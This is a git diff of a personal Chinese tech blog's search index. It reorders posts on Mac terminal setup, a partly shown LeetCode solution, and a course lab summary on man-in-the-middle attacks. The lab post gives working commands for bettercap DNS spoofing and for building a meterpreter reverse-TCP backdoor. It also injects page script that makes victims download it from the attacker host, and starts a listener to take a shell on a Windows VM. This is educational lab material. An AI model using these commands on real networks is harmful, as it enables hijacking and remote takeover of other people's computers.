@@ -1,6 +1,60 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>折腾---美观Mac下的终端</title>
+    <url>/2019/07/21/My-Terminal/</url>
+    <content><![CDATA[<p><del>讲道理</del>，Mac下的shell,嗯就是那个<strong>bash</strong>真的是太丑了，虽然可以修改背景色之类的还是觉得丑，所以就用<strong>iTerm2</strong>这个玩意代替他了，并且使用<strong>zsh</strong>代替了<strong>bash</strong>…<a id="more"></a>虽然<strong>bash</strong>的功能已经很强大，但对于以<del>懒惰</del>为美德的程序员来说，比如说我，bash的提示功能还不够强大，界面也不够酷炫，并非理想工具。而<strong>zsh</strong>的功能及其强大，只是配置过于复杂，起初只有极客在用，后来，有个穷极无聊的程序员可能实在是看不下去广大猿友使用单调的<strong>bash</strong>，于是他创建了一个名为<strong><em>oh-my-zsh</em></strong>的开源项目…</p>
+<p>自此，只需要简单的安装配置，我们也都可以用上<del>高档大气上档次，狂拽炫酷吊炸天的</del><strong><em>oh-my-zsh</em></strong>了。</p>
+<hr>
+<h3 id="一、安装iTerm2代替shell"><a href="#一、安装iTerm2代替shell" class="headerlink" title="一、安装iTerm2代替shell"></a>一、安装iTerm2代替shell</h3><h4 id="1-官方下载地址：https-www-iterm2-com"><a href="#1-官方下载地址：https-www-iterm2-com" class="headerlink" title="1. 官方下载地址：https://www.iterm2.com/"></a>1. <strong>官方下载地址：</strong><a href="https://www.iterm2.com/" target="_blank" rel="noopener">https://www.iterm2.com/</a></h4><p>   安装完成后，在/bin目录下会多出一个zsh的文件。Mac系统默认使用<strong>Bash</strong>作为终端，修改默认为<strong>zsh</strong>的命令如下：</p>
+   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-替换背景图片"><a href="#2-替换背景图片" class="headerlink" title="2. 替换背景图片"></a>2. <strong>替换背景图片</strong></h4><p>   Iterm2-&gt;Preferences-&gt;Profiles-&gt;window-&gt;Background image</p>
+<p>   <img src="/2019/07/21/My-Terminal/change_background.png" alt="change_background"></p>
+<hr>
+<h3 id="二、安装oh-my-zsh"><a href="#二、安装oh-my-zsh" class="headerlink" title="二、安装oh-my-zsh"></a>二、安装oh-my-zsh</h3><p><strong>命令 2种方式：</strong></p>
+   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure>
+
+<p>   或者</p>
+   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure>
+
+<p>   用第二种方式需要wget，如果没有wget请安装</p>
+   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install wget</span><br></pre></td></tr></table></figure>
+
+<p>   如果没有homebrew请自行百度安装这个强大的包管理工具，类似于centos或者ubuntu下的yum和apt-get</p>
+<p>   接下来只需要简单的配置，就可以享受oh-my-zsh的强大啦！</p>
+<hr>
+<h3 id="三、主题选择"><a href="#三、主题选择" class="headerlink" title="三、主题选择"></a>三、主题选择</h3><p>Oh-my-zsh有很多主题，具体请查看：<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/themes" target="_blank" rel="noopener">主题列表</a></p>
+<p>我选择的主题是<code>ys</code></p>
+<p><img src="/2019/07/21/My-Terminal/terminal.png" alt="terminal"></p>
+<p><del>请忽视我正在安装的东西…</del></p>
+<p>想要修改主题，打开~/.zshrc文件修改一下ZSH_THEME变量即可</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure>
+<p>找到ZSH_THEME，将此变量值改为”ys”</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=<span class="string">"ys"</span></span><br></pre></td></tr></table></figure>
+<p>最后更新修改后的配置文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="四、自动补全插件"><a href="#四、自动补全插件" class="headerlink" title="四、自动补全插件"></a>四、自动补全插件</h3><p>linux的命令有很多，想要全部记住是不可能的事情，<del>如果你是大佬当我没说</del>，这时候就需要我们的自动补全插件啦！<br>自动补全插件有很多种，一个是incr.zsh,下载此插件的命令为：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://mimosa-pudica.net/src/incr-0.2.zsh</span><br></pre></td></tr></table></figure>
+<p>这个插件确实很屌，但是存在一些bug，比如很卡顿！对，你可以明显感受到卡顿，有点卡顿或许还能忍，但是在使用命令<code>git clone http</code> 对，我下一个要敲 <code>:</code>    可就在我敲下它的一瞬间，终端竟然卡住了，住了，了…… 应该是提示功能太过强大导致的吧…<br>所以我用了另一个插件代替它的功能，但是就没有第一个插件功能这么牛逼了，他的基本作用就是根据历史输入指令的记录即时的提示，这么看起来也算不上自动补全插件咯，但是也是可以提高一点效率的呀！它就是Autosuggestion<br>首先切换目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.oh-my-zsh/custom/plugins/</span><br></pre></td></tr></table></figure>
+<p>下载插件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
+<p>和修改主题需要修改配置文件一样，先打开配置文件~/.zshrc</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure>
+<p>在最后添加一行，也就是把刚刚下载的插件的路径添加进去</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br></pre></td></tr></table></figure>
+<p>保存后执行更新配置文件命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<p>到这里就结束啦，开始我们的<del>装逼</del>之旅吧嘻嘻嘻！<br>最后贴一张现在的终端界面吧哈哈！<br><img src="/2019/07/21/My-Terminal/terminal_now.png" alt="Terminal_now"><br>为什么这张图这么大呢，哈哈因为我喜欢吧终端常开着放在几个桌面的最左端，有需要的时候直接切换过去，是不是贼方便呢嘻嘻！！</p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Mac下命令行版本的Anaconda安装及常用命令</title>
     <url>/2019/12/03/anaconda-installformac/</url>
     <content><![CDATA[<p>简单记录一下在Mac下Anaconda安装的过程<a id="more"></a></p>
@@ -60,57 +114,66 @@
       </categories>
   </entry>
   <entry>
-    <title>折腾---美观Mac下的终端</title>
-    <url>/2019/07/21/My-Terminal/</url>
-    <content><![CDATA[<p><del>讲道理</del>，Mac下的shell,嗯就是那个<strong>bash</strong>真的是太丑了，虽然可以修改背景色之类的还是觉得丑，所以就用<strong>iTerm2</strong>这个玩意代替他了，并且使用<strong>zsh</strong>代替了<strong>bash</strong>…<a id="more"></a>虽然<strong>bash</strong>的功能已经很强大，但对于以<del>懒惰</del>为美德的程序员来说，比如说我，bash的提示功能还不够强大，界面也不够酷炫，并非理想工具。而<strong>zsh</strong>的功能及其强大，只是配置过于复杂，起初只有极客在用，后来，有个穷极无聊的程序员可能实在是看不下去广大猿友使用单调的<strong>bash</strong>，于是他创建了一个名为<strong><em>oh-my-zsh</em></strong>的开源项目…</p>
-<p>自此，只需要简单的安装配置，我们也都可以用上<del>高档大气上档次，狂拽炫酷吊炸天的</del><strong><em>oh-my-zsh</em></strong>了。</p>
-<hr>
-<h3 id="一、安装iTerm2代替shell"><a href="#一、安装iTerm2代替shell" class="headerlink" title="一、安装iTerm2代替shell"></a>一、安装iTerm2代替shell</h3><h4 id="1-官方下载地址：https-www-iterm2-com"><a href="#1-官方下载地址：https-www-iterm2-com" class="headerlink" title="1. 官方下载地址：https://www.iterm2.com/"></a>1. <strong>官方下载地址：</strong><a href="https://www.iterm2.com/" target="_blank" rel="noopener">https://www.iterm2.com/</a></h4><p>   安装完成后，在/bin目录下会多出一个zsh的文件。Mac系统默认使用<strong>Bash</strong>作为终端，修改默认为<strong>zsh</strong>的命令如下：</p>
-   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
+    <title>使用bettercap进行渗透测试</title>
+    <url>/2019/09/10/hacker-1/</url>
+    <content><![CDATA[<p>软件综合训练—信息安全方向课程总结<a id="more"></a></p>
+<p>（以下所有在虚拟机kali_linux下实现）</p>
+<h3 id="一、bettercap是什么"><a href="#一、bettercap是什么" class="headerlink" title="一、bettercap是什么"></a>一、bettercap是什么</h3><p>bettercap是一款完整，模块化，轻量级，易扩展的中间人攻击测试工具和框架。</p>
+<p><strong>如何安装？</strong></p>
+<h4 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1. 安装依赖"></a>1. 安装依赖</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ruby-dev libpcap-dev</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-替换背景图片"><a href="#2-替换背景图片" class="headerlink" title="2. 替换背景图片"></a>2. <strong>替换背景图片</strong></h4><p>   Iterm2-&gt;Preferences-&gt;Profiles-&gt;window-&gt;Background image</p>
-<p>   <img src="/2019/07/21/My-Terminal/change_background.png" alt="change_background"></p>
-<hr>
-<h3 id="二、安装oh-my-zsh"><a href="#二、安装oh-my-zsh" class="headerlink" title="二、安装oh-my-zsh"></a>二、安装oh-my-zsh</h3><p><strong>命令 2种方式：</strong></p>
-   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure>
+<h4 id="2-安装稳定版本（GEM）"><a href="#2-安装稳定版本（GEM）" class="headerlink" title="2. 安装稳定版本（GEM）"></a>2. 安装稳定版本（GEM）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install bettercap</span><br></pre></td></tr></table></figure>
 
-<p>   或者</p>
-   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure>
+<p>至此，bettercap已成功安装，下面让我们开始吧！</p>
+<h3 id="二、DNS欺骗"><a href="#二、DNS欺骗" class="headerlink" title="二、DNS欺骗"></a>二、DNS欺骗</h3><p>创建一个dns.conf文件，下面这个dns语句的意思是：所有的以<code>.com</code>结尾的网站全部解析到我的本地http服务器，<code>.*.com</code>就是一个正则，也可以是自定义的正则。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.1.1.1 .*.com</span><br></pre></td></tr></table></figure>
 
-<p>   用第二种方式需要wget，如果没有wget请安装</p>
-   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install wget</span><br></pre></td></tr></table></figure>
+<p>之后使用bettercap命令进行DNS欺骗：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bettercap -X -I eth0 -T 192.168.73.129 -G 192.168.73.2 --dns dns.conf</span><br></pre></td></tr></table></figure>
 
-<p>   如果没有homebrew请自行百度安装这个强大的包管理工具，类似于centos或者ubuntu下的yum和apt-get</p>
-<p>   接下来只需要简单的配置，就可以享受oh-my-zsh的强大啦！</p>
-<hr>
-<h3 id="三、主题选择"><a href="#三、主题选择" class="headerlink" title="三、主题选择"></a>三、主题选择</h3><p>Oh-my-zsh有很多主题，具体请查看：<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/themes" target="_blank" rel="noopener">主题列表</a></p>
-<p>我选择的主题是<code>ys</code></p>
-<p><img src="/2019/07/21/My-Terminal/terminal.png" alt="terminal"></p>
-<p><del>请忽视我正在安装的东西…</del></p>
-<p>想要修改主题，打开~/.zshrc文件修改一下ZSH_THEME变量即可</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure>
-<p>找到ZSH_THEME，将此变量值改为”ys”</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=<span class="string">"ys"</span></span><br></pre></td></tr></table></figure>
-<p>最后更新修改后的配置文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="四、自动补全插件"><a href="#四、自动补全插件" class="headerlink" title="四、自动补全插件"></a>四、自动补全插件</h3><p>linux的命令有很多，想要全部记住是不可能的事情，<del>如果你是大佬当我没说</del>，这时候就需要我们的自动补全插件啦！<br>自动补全插件有很多种，一个是incr.zsh,下载此插件的命令为：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://mimosa-pudica.net/src/incr-0.2.zsh</span><br></pre></td></tr></table></figure>
-<p>这个插件确实很屌，但是存在一些bug，比如很卡顿！对，你可以明显感受到卡顿，有点卡顿或许还能忍，但是在使用命令<code>git clone http</code> 对，我下一个要敲 <code>:</code>    可就在我敲下它的一瞬间，终端竟然卡住了，住了，了…… 应该是提示功能太过强大导致的吧…<br>所以我用了另一个插件代替它的功能，但是就没有第一个插件功能这么牛逼了，他的基本作用就是根据历史输入指令的记录即时的提示，这么看起来也算不上自动补全插件咯，但是也是可以提高一点效率的呀！它就是Autosuggestion<br>首先切换目录</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.oh-my-zsh/custom/plugins/</span><br></pre></td></tr></table></figure>
-<p>下载插件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
-<p>和修改主题需要修改配置文件一样，先打开配置文件~/.zshrc</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure>
-<p>在最后添加一行，也就是把刚刚下载的插件的路径添加进去</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br></pre></td></tr></table></figure>
-<p>保存后执行更新配置文件命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
+<p>第一个ip地址为局域网内要攻击的主机ip地址，-G参数为网关。</p>
+<p>为什么一定是局域网内的呢，因为我们利用的是ARP报文的广播原理，而ARP报文只能在同一网段内广播，因此我们需要将kali_linux与受攻击的win7在同一网段下，由于我是用VMwa re开了这两个虚拟机，都是利用nat链接，当然属于同一个网段啦！</p>
+<p><img src="/2019/09/10/hacker-1/dns.png" alt="dns"></p>
+<p>之后被攻击的win7主机会出现什么现象呢？</p>
+<p><img src="/2019/09/10/hacker-1/win7_1.png" alt="win7_1"></p>
+<p>可以看到，ping百度的域名却返回的是我们在dns.conf中写入的1.1.1.1</p>
+<h3 id="三、ARP欺骗-msf"><a href="#三、ARP欺骗-msf" class="headerlink" title="三、ARP欺骗+msf"></a>三、ARP欺骗+msf</h3><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统签名开发。</p>
+<p><strong>进行html注入中间人攻击</strong></p>
+<h4 id="1-生成后门"><a href="#1-生成后门" class="headerlink" title="1. 生成后门"></a>1. 生成后门</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.73.128 LPORT=444 -f exe &gt; run.exe</span><br></pre></td></tr></table></figure>
 
-<p>到这里就结束啦，开始我们的<del>装逼</del>之旅吧嘻嘻嘻！<br>最后贴一张现在的终端界面吧哈哈！<br><img src="/2019/07/21/My-Terminal/terminal_now.png" alt="Terminal_now"><br>为什么这张图这么大呢，哈哈因为我喜欢吧终端常开着放在几个桌面的最左端，有需要的时候直接切换过去，是不是贼方便呢嘻嘻！！</p>
+<p>LHOST为监听主机ip，即攻击者ip。生成一个run.exe文件。</p>
+<p><img src="/2019/09/10/hacker-1/runexe.png" alt="runexe"></p>
+<h4 id="2-启动本地http服务"><a href="#2-启动本地http服务" class="headerlink" title="2. 启动本地http服务"></a>2. 启动本地http服务</h4><p>首先使用screen创建后台：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S test1</span><br></pre></td></tr></table></figure>
+
+<p>​    之后输入：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/10/hacker-1/test1.png" alt="test1"></p>
+<p>按ctrl+a+d返回。</p>
+<h4 id="3-启动注入中间人攻击"><a href="#3-启动注入中间人攻击" class="headerlink" title="3. 启动注入中间人攻击"></a>3. 启动注入中间人攻击</h4><p>同样的，我们先使用screen创建一个新后台test2</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bettercap -I eth0 -X  -T 192.168.73.129  -G 192.168.73.2  --proxy-module=injecthtml --html-data <span class="string">"&lt;script&gt;document.body.onclick = function()&#123;window.open('http://192.168.73.128:8888/run.exe')&#125; &lt;/script&gt;"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/10/hacker-1/test2.png" alt="test2"><br>按ctrl+a+d返回</p>
+<h4 id="4-在本地启动监听"><a href="#4-在本地启动监听" class="headerlink" title="4. 在本地启动监听"></a>4. 在本地启动监听</h4><p>与前面一样，创建新后台test3。</p>
+<p>之后输入命令如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">		msf &gt; </span><br><span class="line">		use exploit/multi/handler</span><br><span class="line">		<span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">		<span class="built_in">set</span> lhost 192.168.73.128</span><br><span class="line">		<span class="built_in">set</span> lport 444</span><br><span class="line">		run -j</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/10/hacker-1/test3.png" alt="test3"></p>
+<h4 id="5-在被攻击端运行run-exe"><a href="#5-在被攻击端运行run-exe" class="headerlink" title="5. 在被攻击端运行run.exe"></a>5. 在被攻击端运行run.exe</h4><p>使用被攻击的win7虚拟机随便打开一个网页，比如 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 之后随便点击一个地方，就会触发我们注入html源码中的函数，跳转到我们的攻击主机ip+端口的web服务上并下载run.exe文件，若点击运行，则被攻击主机的控制权我们就可以拿到了。</p>
+<p><img src="/2019/09/10/hacker-1/downrunexe.png" alt="download"></p>
+<h4 id="6-获得被攻击主机的控制权"><a href="#6-获得被攻击主机的控制权" class="headerlink" title="6. 获得被攻击主机的控制权"></a>6. 获得被攻击主机的控制权</h4><p>在我们的监听会话中我们输入<code>sessions</code>命令可以看到如下内容：</p>
+<p><img src="/2019/09/10/hacker-1/sessions.png" alt="sessions"></p>
+<p>​    我们可以看到id为1的主机便是我们攻击的主机，那么接下来怎么获取它的控制权呢，很简单，我们只要输入：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sessions 1</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<p><code>meterpreter &gt;</code>为输入<code>sessions 1</code>之后的提示符不需要输入。</p>
+<p>​    接下来我们便可以看到如下内容：</p>
+<p><img src="/2019/09/10/hacker-1/end.png" alt="end"></p>
+<p>这个界面是不是很熟悉呢，嘿嘿嘿</p>
 ]]></content>
       <categories>
-        <category>Daily Essays</category>
+        <category>软件综合训练课程</category>
       </categories>
   </entry>
   <entry>
@@ -201,69 +264,6 @@
 
 <p><img src="/2019/09/11/hacker-2/14.png" alt="14.png"></p>
 <p>好了，我们终于成功了！嘿嘿嘿！</p>
-]]></content>
-      <categories>
-        <category>软件综合训练课程</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>使用bettercap进行渗透测试</title>
-    <url>/2019/09/10/hacker-1/</url>
-    <content><![CDATA[<p>软件综合训练—信息安全方向课程总结<a id="more"></a></p>
-<p>（以下所有在虚拟机kali_linux下实现）</p>
-<h3 id="一、bettercap是什么"><a href="#一、bettercap是什么" class="headerlink" title="一、bettercap是什么"></a>一、bettercap是什么</h3><p>bettercap是一款完整，模块化，轻量级，易扩展的中间人攻击测试工具和框架。</p>
-<p><strong>如何安装？</strong></p>
-<h4 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1. 安装依赖"></a>1. 安装依赖</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ruby-dev libpcap-dev</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-安装稳定版本（GEM）"><a href="#2-安装稳定版本（GEM）" class="headerlink" title="2. 安装稳定版本（GEM）"></a>2. 安装稳定版本（GEM）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install bettercap</span><br></pre></td></tr></table></figure>
-
-<p>至此，bettercap已成功安装，下面让我们开始吧！</p>
-<h3 id="二、DNS欺骗"><a href="#二、DNS欺骗" class="headerlink" title="二、DNS欺骗"></a>二、DNS欺骗</h3><p>创建一个dns.conf文件，下面这个dns语句的意思是：所有的以<code>.com</code>结尾的网站全部解析到我的本地http服务器，<code>.*.com</code>就是一个正则，也可以是自定义的正则。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.1.1.1 .*.com</span><br></pre></td></tr></table></figure>
-
-<p>之后使用bettercap命令进行DNS欺骗：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bettercap -X -I eth0 -T 192.168.73.129 -G 192.168.73.2 --dns dns.conf</span><br></pre></td></tr></table></figure>
-
-<p>第一个ip地址为局域网内要攻击的主机ip地址，-G参数为网关。</p>
-<p>为什么一定是局域网内的呢，因为我们利用的是ARP报文的广播原理，而ARP报文只能在同一网段内广播，因此我们需要将kali_linux与受攻击的win7在同一网段下，由于我是用VMwa re开了这两个虚拟机，都是利用nat链接，当然属于同一个网段啦！</p>
-<p><img src="/2019/09/10/hacker-1/dns.png" alt="dns"></p>
-<p>之后被攻击的win7主机会出现什么现象呢？</p>
-<p><img src="/2019/09/10/hacker-1/win7_1.png" alt="win7_1"></p>
-<p>可以看到，ping百度的域名却返回的是我们在dns.conf中写入的1.1.1.1</p>
-<h3 id="三、ARP欺骗-msf"><a href="#三、ARP欺骗-msf" class="headerlink" title="三、ARP欺骗+msf"></a>三、ARP欺骗+msf</h3><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统签名开发。</p>
-<p><strong>进行html注入中间人攻击</strong></p>
-<h4 id="1-生成后门"><a href="#1-生成后门" class="headerlink" title="1. 生成后门"></a>1. 生成后门</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.73.128 LPORT=444 -f exe &gt; run.exe</span><br></pre></td></tr></table></figure>
-
-<p>LHOST为监听主机ip，即攻击者ip。生成一个run.exe文件。</p>
-<p><img src="/2019/09/10/hacker-1/runexe.png" alt="runexe"></p>
-<h4 id="2-启动本地http服务"><a href="#2-启动本地http服务" class="headerlink" title="2. 启动本地http服务"></a>2. 启动本地http服务</h4><p>首先使用screen创建后台：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S test1</span><br></pre></td></tr></table></figure>
-
-<p>​    之后输入：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/09/10/hacker-1/test1.png" alt="test1"></p>
-<p>按ctrl+a+d返回。</p>
-<h4 id="3-启动注入中间人攻击"><a href="#3-启动注入中间人攻击" class="headerlink" title="3. 启动注入中间人攻击"></a>3. 启动注入中间人攻击</h4><p>同样的，我们先使用screen创建一个新后台test2</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bettercap -I eth0 -X  -T 192.168.73.129  -G 192.168.73.2  --proxy-module=injecthtml --html-data <span class="string">"&lt;script&gt;document.body.onclick = function()&#123;window.open('http://192.168.73.128:8888/run.exe')&#125; &lt;/script&gt;"</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/09/10/hacker-1/test2.png" alt="test2"><br>按ctrl+a+d返回</p>
-<h4 id="4-在本地启动监听"><a href="#4-在本地启动监听" class="headerlink" title="4. 在本地启动监听"></a>4. 在本地启动监听</h4><p>与前面一样，创建新后台test3。</p>
-<p>之后输入命令如下所示：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">		msf &gt; </span><br><span class="line">		use exploit/multi/handler</span><br><span class="line">		<span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">		<span class="built_in">set</span> lhost 192.168.73.128</span><br><span class="line">		<span class="built_in">set</span> lport 444</span><br><span class="line">		run -j</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/09/10/hacker-1/test3.png" alt="test3"></p>
-<h4 id="5-在被攻击端运行run-exe"><a href="#5-在被攻击端运行run-exe" class="headerlink" title="5. 在被攻击端运行run.exe"></a>5. 在被攻击端运行run.exe</h4><p>使用被攻击的win7虚拟机随便打开一个网页，比如 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 之后随便点击一个地方，就会触发我们注入html源码中的函数，跳转到我们的攻击主机ip+端口的web服务上并下载run.exe文件，若点击运行，则被攻击主机的控制权我们就可以拿到了。</p>
-<p><img src="/2019/09/10/hacker-1/downrunexe.png" alt="download"></p>
-<h4 id="6-获得被攻击主机的控制权"><a href="#6-获得被攻击主机的控制权" class="headerlink" title="6. 获得被攻击主机的控制权"></a>6. 获得被攻击主机的控制权</h4><p>在我们的监听会话中我们输入<code>sessions</code>命令可以看到如下内容：</p>
-<p><img src="/2019/09/10/hacker-1/sessions.png" alt="sessions"></p>
-<p>​    我们可以看到id为1的主机便是我们攻击的主机，那么接下来怎么获取它的控制权呢，很简单，我们只要输入：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sessions 1</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
-
-<p><code>meterpreter &gt;</code>为输入<code>sessions 1</code>之后的提示符不需要输入。</p>
-<p>​    接下来我们便可以看到如下内容：</p>
-<p><img src="/2019/09/10/hacker-1/end.png" alt="end"></p>
-<p>这个界面是不是很熟悉呢，嘿嘿嘿</p>
 ]]></content>
       <categories>
         <category>软件综合训练课程</category>
@@ -599,6 +599,32 @@
       </categories>
   </entry>
   <entry>
+    <title>LeetCode DAY 5 (7-8)</title>
+    <url>/2020/01/14/leetcode-day5/</url>
+    <content><![CDATA[<p>虽然打了一下午的游戏，但懒狗不会忘记刷题的！<a id="more"></a></p>
+<h3 id="7-整数反转（简单）"><a href="#7-整数反转（简单）" class="headerlink" title="7. 整数反转（简单）"></a>7. 整数反转（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给出一个32位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p>
+<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 123</span><br><span class="line">输出: 321</span><br></pre></td></tr></table></figure>
+<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: -123</span><br><span class="line">输出: -321</span><br></pre></td></tr></table></figure>
+<h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 120</span><br><span class="line">输出: 21</span><br></pre></td></tr></table></figure>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：弹出和推入数字-amp-溢出前进行检查"><a href="#解法1：弹出和推入数字-amp-溢出前进行检查" class="headerlink" title="解法1：弹出和推入数字 &amp; 溢出前进行检查"></a>解法1：弹出和推入数字 &amp; 溢出前进行检查</h5><p>取出一位数字很显然用到<code>%</code>，之后需要用<code>//</code>将取出的一位数字从原数值中删去。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        y, ans = abs(x), <span class="number">0</span></span><br><span class="line">        <span class="comment"># 边界</span></span><br><span class="line">        boundry = (<span class="number">1</span>&lt;&lt;<span class="number">31</span>) <span class="keyword">if</span> x&lt;<span class="number">0</span> <span class="keyword">else</span> 